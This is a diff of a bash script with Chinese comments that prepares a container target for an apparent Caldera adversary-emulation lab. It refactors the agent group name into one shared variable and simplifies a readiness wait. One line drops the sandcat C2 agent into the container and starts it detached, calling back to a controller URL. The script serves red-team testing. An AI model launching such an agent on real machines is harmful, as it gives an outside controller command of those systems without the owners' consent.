@@ -33,6 +33,9 @@
 #   EDGEEXP_C2_HOST           容器侧可达的宿主地址（默认取容器内默认网关；覆盖见"地址给错了机器"那段）
 #   EDGEEXP_SANDCAT_PAYLOAD   sandcat 载荷路径（默认 /opt/caldera/plugins/sandcat/payloads/sandcat.go-linux）
 #   EDGEEXP_AGENT_WAIT_S      等 agent 回连的上限（秒，默认 180）
+#   EDGEEXP_ATTACK_GROUP      agent 的**分组名**（默认 t4d-ttp）。它与攻击侧的投送范围
+#                             （`edge_attack.sh` 的 `EDGEEXP_ATTACK_GROUP`）是**同一个变量** ——
+#                             组名只有一处来源，两侧不一致时不会出现"你其实已经拉过了"这种误诊
 #   EDGEEXP_APT_TIMEOUT_S     单次 apt 安装的上限（秒，默认 900）
 # ============================================================================
 set -uo pipefail
@@ -51,36 +54,33 @@ PAYLOAD="${EDGEEXP_SANDCAT_PAYLOAD:-/opt/caldera/plugins/sandcat/payloads/sandca
 AGENT_WAIT_S="${EDGEEXP_AGENT_WAIT_S:-180}"
 APT_TIMEOUT_S="${EDGEEXP_APT_TIMEOUT_S:-900}"
 PIDS_HELPER="$SCRIPT_DIR/edge_lab_pids.sh"
+# **agent 分组名只有一个来源：`EDGEEXP_ATTACK_GROUP`**（Task 4D Fix round 2 / Minor-4）。
+#
+# 上一版这里把 `--group t4d-ttp` **硬编码**在拉起命令里，而攻击侧要求用 `EDGEEXP_ATTACK_GROUP`
+# 声明 operation 的投送范围 ⇒ 同一个组名有**两处来源**。两侧不一致时攻击侧的闸门①会响亮失败
+# （不是静默出错，这点是好的），但它的错误信息让操作者"用 --group 拉起 agent" —— 而他其实已经拉了，
+# **诊断方向指错**。现在两处读同一个变量：目标 agent 拉起时的 `--group` 与攻击侧的投送范围同源。
+AGENT_GROUP="${EDGEEXP_ATTACK_GROUP:-t4d-ttp}"
 
 [ -n "$TARGET" ] || { echo "edge_target_prepare: 必须给 EDGEEXP_TARGET=<实例名>" >&2; exit 2; }
 command -v python3 >/dev/null 2>&1 || { echo "edge_target_prepare: 缺少 python3" >&2; exit 2; }
 [ -f "$PIDS_HELPER" ] || { echo "edge_target_prepare: 缺少 $PIDS_HELPER" >&2; exit 2; }
 
-echo "edge_target_prepare: 目标=$TARGET 基质=$lab_substrate 策略=$([ "$POLICY_ON" = "1" ] && echo 在 || echo 不在)"
+echo "edge_target_prepare: 目标=$TARGET 基质=$lab_substrate 策略=$([ "$POLICY_ON" = "1" ] && echo 在 || echo 不在) agent 组=$AGENT_GROUP（来源 EDGEEXP_ATTACK_GROUP，攻击侧同一变量）"
 
-# wait_for_exec <秒> —— 等实例真的**能在里面执行命令**（这才是后面每一步真正需要的能力）。
+# wait_for_exec <秒> —— 等实例真的**能在里面执行命令**；判据与实现都在**基质层**
+# （`edge_lab.sh:lab_wait_node_exec`，Task 4D Fix round 2 / Minor-6 把那条判据收进基质层的原因见那里）。
 #
-# `lab_node_running` 的返回值打在 **stdout 上**（`true`/`false`），rc 只表达"问得到/问不到"。
-# 实测踩坑（Task 4D Step 4-B2）：写成 `until lab_node_running "$TARGET" >/dev/null 2>&1; do …`
-# 会把值丢掉，于是循环在 `lxc info` 一能应答时就退出 —— 而 **STOPPED 的实例同样能应答**。
-# 后果不是"少等一会儿"，而是**接着往下做**：后面第一次 `exec` 撞上 `Error: Instance is not running`，
-# 而本脚本是 `set -uo pipefail`（**没有 -e**，每一步自己判失败）⇒ 那行错被咽下去，
-# 整轮以"agent 在 180s 内没有回连"收场（真正的错因埋在中间一行里）。
-#
-# 第二层踩坑（同轮实测）：只查"状态=RUNNING"**仍然不够**。`lxc restart` 是"先停后起"，
-# 在它刚被发起、容器还**没开始停**的那一瞬间 `lxc info` 依然是 RUNNING ⇒ 检查立刻通过，
-# 而随后的 exec 正好落在"停/起之间"（实测：容器此刻 STOPPED，`mv` 以 `Instance is not running` 失败）。
-# 因此配 `wait_for_up <pid>` 使用：先等**发起重启的那个子进程自己退出**，再等 exec 真的可用。
+# 这里只保留"把超时翻译成本脚本的处置"：
+# 上一版的坑是调用方自己写了 `until lab_node_running … >/dev/null 2>&1`，把打在 stdout 上的
+# `true`/`false` 丢掉 ⇒ STOPPED 的实例同样能应答、循环 0 秒就宣布"已就绪"，随后 `exec` 撞上
+# `Error: Instance is not running`（而本脚本 **没有 `set -e`**，那行错被咽下去）。
+# 第二层坑：`lxc restart` 是"先停后起"，刚发起时 `lxc info` 仍是 RUNNING ⇒ 只查状态依然不够。
 wait_for_exec() {
-  local limit="$1" waited=0
-  while ! lab_target_exec "$TARGET" true >/dev/null 2>&1; do
-    if [ "$waited" -ge "$limit" ]; then
-      echo "edge_target_prepare: 实例 $TARGET 在 ${limit}s 内仍然不能执行命令（判据：节点内 true 的 rc=0）" >&2
-      return 1
-    fi
-    sleep 3; waited=$((waited + 3))
-  done
-  return 0
+  local limit="$1"
+  lab_wait_node_exec "$TARGET" "$limit" && return 0
+  echo "edge_target_prepare: 实例 $TARGET 在 ${limit}s 内仍然不能执行命令（判据：节点内 true 的 rc=0）" >&2
+  return 1
 }
 
 # wait_for_up <pid> <秒> —— 等"停/起"走完：① 发起它的子进程退出；② 节点内真能执行命令。
@@ -326,7 +326,7 @@ else
   lab_target_exec "$TARGET" sh -c 'mv -f /root/sandcat.new /root/sandcat && chmod 755 /root/sandcat' \
     || { echo "edge_target_prepare: 在 $TARGET 内落地 /root/sandcat 失败" >&2; exit 1; }
   # 用 `setsid` 起（`lxc exec` 通道一断，没有 setsid 的子进程会被带走 —— 实测过）
-  lab_target_exec "$TARGET" sh -c "setsid /root/sandcat --server $C2_URL --group t4d-ttp > /tmp/sandcat.log 2>&1 < /dev/null & echo launched" \
+  lab_target_exec "$TARGET" sh -c "setsid /root/sandcat --server $C2_URL --group $AGENT_GROUP > /tmp/sandcat.log 2>&1 < /dev/null & echo launched" \
     || { echo "edge_target_prepare: 在 $TARGET 内拉起 sandcat 失败" >&2; exit 1; }
   waited=0
   while :; do
@@ -352,5 +352,5 @@ else
 fi
 
 # 收尾自证：容器与 Caldera 两条证据都打出来（供运行级留痕）
-echo "edge_target_prepare: 就绪 —— 实例 $TARGET 运行中，策略=$([ "$POLICY_ON" = "1" ] && echo 在 || echo 不在)，agent=$PAW，重启过=$RESTARTED"
+echo "edge_target_prepare: 就绪 —— 实例 $TARGET 运行中，策略=$([ "$POLICY_ON" = "1" ] && echo 在 || echo 不在)，agent=$PAW（组=$AGENT_GROUP），重启过=$RESTARTED"
 exit 0
